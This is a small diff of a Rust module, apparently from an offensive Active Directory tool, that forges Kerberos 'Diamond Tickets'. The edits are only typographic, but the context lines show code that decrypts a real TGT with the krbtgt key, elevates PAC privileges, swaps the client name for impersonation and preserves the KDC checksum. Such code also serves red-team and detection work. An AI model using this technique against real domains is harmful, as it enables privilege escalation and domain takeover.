@@ -1,4 +1,4 @@
-//! Diamond Ticket forging — modify a legitimately requested TGT's PAC.
+//! Diamond Ticket forging -- modify a legitimately requested TGT's PAC.
 //!
 //! Unlike Golden Tickets (forged from scratch), Diamond Tickets start
 //! with a real TGT, decrypt it with the krbtgt key, modify the PAC,
@@ -89,7 +89,7 @@ pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
     info!("[diamond] Ticket decrypted successfully");
 
     // Step 3: Extract original KDC checksum from the legitimate PAC before modifying
-    // This is the Enhanced Diamond technique — we preserve the KDC_ISSUED checksum bytes
+    // This is the Enhanced Diamond technique -- we preserve the KDC_ISSUED checksum bytes
     let original_kdc_checksum = extract_kdc_checksum(&enc_ticket);
 
     // Step 4: Modify the PAC with elevated privileges
@@ -140,7 +140,7 @@ pub async fn forge_diamond_ticket(config: &ForgeConfig) -> Result<ForgeResult> {
             name_string: vec![impersonate.to_string()],
         };
         info!(
-            "[diamond] Changed cname: {} → {}",
+            "[diamond] Changed cname: {} -> {}",
             config.username, impersonate
         );
     }
@@ -243,7 +243,7 @@ fn extract_kdc_checksum(enc_ticket: &EncTicketPart) -> Option<Vec<u8>> {
             pac[offset + 3],
         ]);
         if buf_type == 7 {
-            // Found KDC checksum — return the full buffer entry (type + size + offset + data)
+            // Found KDC checksum -- return the full buffer entry (type + size + offset + data)
             let buf_size = u32::from_le_bytes([
                 pac[offset + 4],
                 pac[offset + 5],
